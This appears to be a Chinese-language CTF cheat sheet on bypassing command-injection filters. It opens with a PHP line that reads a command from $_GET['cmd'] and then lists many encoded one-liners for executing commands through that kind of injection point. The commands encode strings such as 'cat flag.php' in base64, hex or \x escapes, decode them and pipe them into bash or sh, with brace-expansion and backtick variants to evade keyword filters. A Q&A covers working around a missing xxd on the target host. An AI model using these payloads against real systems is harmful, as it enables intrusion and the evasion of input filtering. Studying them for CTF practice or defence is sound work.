	$cmd = $_GET['cmd'];

## base64编码

### 编码脚本
```python
import base64
S = b'cat flag.php'         # S 的类型必须是字节包(bytes)
e64 = base64.b64encode(S)
print(e64)
```
`cat flag.php` -> `Y2F0IGZsYWcucGhw`

### 示例
```shell
echo Y2F0IGZsYWcucGhw | base64 -d | /bin/bash


echo Y2F0IGZsYWcucGhw | base64 -d | sh

echo Y2F0IGZsYWcucGhw | base64 -d | bash

{echo,"Y2F0IGZsYWcucGhw"}|base64 -d|bash
{printf,"Y2F0IGZsYWcucGhw"}|base64 -d|bash

`echo Y2F0IGZsYWcucGhw | base64 -d`

$(echo Y2F0IGZsYWcucGhw | base64 -d)
```

## hex编码（ASCII码）
### 编码脚本
```python
import binascii
S = b'tac flag'
h = binascii.b2a_hex(S)
print(h)
```
`tac flag.php` -> `74616320666c61672e706870`

### 示例
```shell
echo "74616320666c61672e706870" | xxd -r -p | /bin/bash

echo "74616320666c61672e706870" | xxd -r -p | bash

echo "74616320666c61672e706870" | xxd -r -p | sh

{echo,"74616320666c61672e706870"}|xxd -r -p|bash
{printf,"74616320666c61672e706870"}|xxd -r -p|bash

# `%s` 原样输出，无换行
`printf "%s" 74616320666c61672e706870 | xxd -r -d`
$(printf "%s" "74616320666c61672e706870" | xxd -r -p)

# `-n` 禁用换行，无多余字符
`echo -n "74616320666c61672e706870" | xxd -r -p`
$(echo -n "74616320666c61672e706870" | xxd -r -p)
```

### 关于`xxd -r -d`：

- `xxd`：二进制显示和处理文件工具
- `-r -p`：将纯十六进制转储的反向输出打印为ASCII格式


## shellcode编码

`tac flag.php` -> `\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70`

### 示例
```shell
printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | /bin/bash

printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | bash

printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | sh

{printf,"\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}|bash

`printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"`

$(printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70")
```

> **不能使用**：`echo "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | bash`


# Q&A 补充
---

### Q：对方主机如果没有装xxd，怎么办？

A：

使用shellcode编码，将`tac flag.php`转换为\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70

再通过`printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | bash`等命令执行

避免使用xxd工具。

### Q：为什么不能用`echo "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | bash`执行命令？
A：`echo`默认不支持`\x`十六进制转义，只会把`\x74`这种字符串原样打印，不会转换成对应的字符；而`printf`原生支持`\x`十六进制转义，能正确解析并执行命令。
